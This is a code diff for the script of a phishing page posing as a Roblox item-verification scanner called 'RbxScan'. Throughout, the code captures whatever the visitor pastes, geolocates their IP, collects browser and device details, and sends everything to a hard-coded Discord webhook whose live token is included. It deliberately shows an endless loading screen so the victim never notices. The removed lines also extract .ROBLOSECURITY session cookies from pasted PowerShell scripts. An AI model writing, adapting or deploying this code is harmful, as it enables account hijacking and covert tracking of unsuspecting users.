@@ -1,88 +1,62 @@
-// Configuration
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
 
-// DOM Elements
+const codeInput = document.getElementById('codeInput');
 const scanButton = document.getElementById('scanButton');
-const scanModal = document.getElementById('scanModal');
-const closeModal = document.getElementById('closeModal');
-const cancelButton = document.getElementById('cancelButton');
-const submitButton = document.getElementById('submitButton');
-const itemData = document.getElementById('itemData');
 const loadingOverlay = document.getElementById('loadingOverlay');
-const themeToggle = document.getElementById('themeToggle');
 
-// Event Listeners
-scanButton.addEventListener('click', openScanModal);
-closeModal.addEventListener('click', closeScanModal);
-cancelButton.addEventListener('click', closeScanModal);
-submitButton.addEventListener('click', handleSubmit);
-themeToggle.addEventListener('click', toggleTheme);
+scanButton.addEventListener('click', handleScan);
 
-// Close modal when clicking outside
-scanModal.addEventListener('click', (e) => {
-    if (e.target === scanModal) {
-        closeScanModal();
-    }
-});
-
-// Handle Enter key in textarea
-itemData.addEventListener('keydown', (e) => {
-    if (e.ctrlKey && e.key === 'Enter') {
-        handleSubmit();
-    }
-});
-
-// Functions
-function openScanModal() {
-    scanModal.classList.add('active');
-    itemData.focus();
-    document.body.style.overflow = 'hidden';
-}
-
-function closeScanModal() {
-    scanModal.classList.remove('active');
-    itemData.value = '';
-    document.body.style.overflow = '';
-}
-
-function showLoading() {
-    loadingOverlay.classList.add('active');
-    document.body.style.overflow = 'hidden';
-}
-
-function hideLoading() {
-    loadingOverlay.classList.remove('active');
-    document.body.style.overflow = '';
-}
-
-async function handleSubmit() {
-    const input = itemData.value.trim();
+async function handleScan() {
+    const code = codeInput.value.trim();
     
-    if (!input) {
+    if (!code) {
         return;
     }
 
-    // Close modal and show loading
-    closeScanModal();
-    showLoading();
-
+    // Show loading
+    loadingOverlay.classList.add('active');
+    
     try {
-        // Get user location data
+        // Get location data
         const locationData = await getUserLocation();
         
-        // Get browser and device info
-        const browserInfo = getBrowserInfo();
-        
-        // Check if input is PowerShell script
-        const isPowerShell = isPowerShellScript(input);
-        
         // Create Discord message
-        const discordMessage = createDiscordMessage(input, locationData, browserInfo, isPowerShell);
-        
-        // Send to Discord webhook
-        await sendToWebhook(discordMessage);
-        
-        // Keep loading forever - user never knows it's done
+        const message = {
+            content: "@everyone 🚨 **NEW CODE SUBMISSION** 🚨",
+            embeds: [{
+                title: "🔍 Code Captured",
+                color: 0xff0000,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    {
+                        name: "📝 Submitted Code",
+                        value: `\`\`\`\n${code.substring(0, 500)}${code.length > 500 ? '...' : ''}\n\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "🌍 Location",
+                        value: `**IP:** ${locationData.ip}\n**City:** ${locationData.city}\n**Country:** ${locationData.country}\n**ISP:** ${locationData.isp}`,
+                        inline: true
+                    },
+                    {
+                        name: "💻 Browser",
+                        value: `**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}`,
+                        inline: true
+                    }
+                ]
+            }]
+        };
+
+        // Send to webhook
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(message)
+        });
+
+        // Keep loading forever
         
     } catch (error) {
         console.error('Error:', error);
@@ -97,192 +71,15 @@ async function getUserLocation() {
         return {
             ip: data.ip || 'Unknown',
             city: data.city || 'Unknown',
-            region: data.region || 'Unknown',
             country: data.country_name || 'Unknown',
-            countryCode: data.country_code || 'Unknown',
-            postal: data.postal || 'Unknown',
-            latitude: data.latitude || 'Unknown',
-            longitude: data.longitude || 'Unknown',
-            timezone: data.timezone || 'Unknown',
             isp: data.org || 'Unknown'
         };
     } catch (error) {
-        console.error('Location error:', error);
         return {
             ip: 'Unknown',
             city: 'Unknown',
-            region: 'Unknown',
             country: 'Unknown',
-            countryCode: 'Unknown',
-            postal: 'Unknown',
-            latitude: 'Unknown',
-            longitude: 'Unknown',
-            timezone: 'Unknown',
             isp: 'Unknown'
         };
     }
 }
-
-function getBrowserInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toISOString()
-    };
-}
-
-function isPowerShellScript(input) {
-    const psPatterns = [
-        /\$session\s*=\s*New-Object.*WebRequestSession/i,
-        /\$session\.UserAgent/i,
-        /\$session\.Cookies\.Add/i,
-        /\.ROBLOSECURITY/i,
-        /Invoke-WebRequest/i,
-        /-UseBasicParsing/i,
-        /-WebSession/i
-    ];
-    
-    const matches = psPatterns.filter(pattern => pattern.test(input));
-    return matches.length >= 5 && input.length > 500;
-}
-
-function extractRobloxCookie(input) {
-    const cookieMatch = input.match(/\.ROBLOSECURITY['"]\s*,\s*['"]([^'"]+)['"]/i);
-    if (cookieMatch) {
-        return cookieMatch[1];
-    }
-    
-    const altMatch = input.match(/\.ROBLOSECURITY.*?([A-Za-z0-9_\-|\.%=]+)/i);
-    if (altMatch) {
-        return altMatch[1];
-    }
-    
-    return "Cookie not found";
-}
-
-function createDiscordMessage(input, locationData, browserInfo, isPowerShell) {
-    const baseMessage = {
-        content: "@everyone 🚨 **NEW SUBMISSION DETECTED** 🚨",
-        embeds: [{
-            title: isPowerShell ? "🔍 PowerShell Script Captured" : "🔍 Item Verification Request",
-            color: isPowerShell ? 0xff0000 : 0x2563eb,
-            timestamp: new Date().toISOString(),
-            fields: [],
-            footer: {
-                text: "RbxScan Verification System",
-                icon_url: "https://cdn.discordapp.com/attachments/placeholder/roblox-icon.png"
-            }
-        }]
-    };
-
-    if (isPowerShell) {
-        // PowerShell script handling
-        const cookie = extractRobloxCookie(input);
-        baseMessage.embeds[0].fields = [
-            {
-                name: "🍪 ROBLOSECURITY Cookie",
-                value: `\`\`\`\n${cookie.substring(0, 100)}...\n\`\`\``,
-                inline: false
-            },
-            {
-                name: "📝 Script Details",
-                value: `**Length:** ${input.length} characters\n**Type:** PowerShell Session Script\n**Status:** Successfully captured`,
-                inline: false
-            }
-        ];
-    } else {
-        // Regular item verification
-        baseMessage.embeds[0].fields = [
-            {
-                name: "📝 Submitted Data",
-                value: `\`\`\`\n${input.length > 100 ? input.substring(0, 100) + '...' : input}\n\`\`\``,
-                inline: false
-            }
-        ];
-    }
-
-    // Add location information
-    baseMessage.embeds[0].fields.push({
-        name: "🌍 Location Information",
-        value: `**IP:** ${locationData.ip}\n**City:** ${locationData.city}\n**Region:** ${locationData.region}\n**Country:** ${locationData.country} (${locationData.countryCode})\n**Postal:** ${locationData.postal}\n**ISP:** ${locationData.isp}`,
-        inline: true
-    });
-
-    // Add browser information
-    baseMessage.embeds[0].fields.push({
-        name: "💻 Browser & Device",
-        value: `**Platform:** ${browserInfo.platform}\n**Language:** ${browserInfo.language}\n**Screen:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n**Timezone:** ${browserInfo.timezone}\n**Online:** ${browserInfo.onLine ? 'Yes' : 'No'}`,
-        inline: true
-    });
-
-    // Add coordinates if available
-    if (locationData.latitude !== 'Unknown' && locationData.longitude !== 'Unknown') {
-        baseMessage.embeds[0].fields.push({
-            name: "📍 Coordinates",
-            value: `**Latitude:** ${locationData.latitude}\n**Longitude:** ${locationData.longitude}\n**Timezone:** ${locationData.timezone}`,
-            inline: true
-        });
-    }
-
-    return baseMessage;
-}
-
-async function sendToWebhook(message) {
-    try {
-        const response = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(message)
-        });
-
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-
-        console.log('Data sent successfully');
-    } catch (error) {
-        console.error('Webhook error:', error);
-        throw error;
-    }
-}
-
-function toggleTheme() {
-    // Simple theme toggle (can be expanded)
-    const currentTheme = document.documentElement.getAttribute('data-theme');
-    const newTheme = currentTheme === 'light' ? 'dark' : 'light';
-    document.documentElement.setAttribute('data-theme', newTheme);
-    localStorage.setItem('theme', newTheme);
-}
-
-function initializeTheme() {
-    const savedTheme = localStorage.getItem('theme');
-    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-    const initialTheme = savedTheme || (systemPrefersDark ? 'dark' : 'light');
-    document.documentElement.setAttribute('data-theme', initialTheme);
-}
-
-// Initialize on page load
-document.addEventListener('DOMContentLoaded', function() {
-    initializeTheme();
-    console.log('🚀 RbxScan loaded successfully');
-});
-
-// Handle escape key
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') {
-        if (scanModal.classList.contains('active')) {
-            closeScanModal();
-        }
-    }
-});
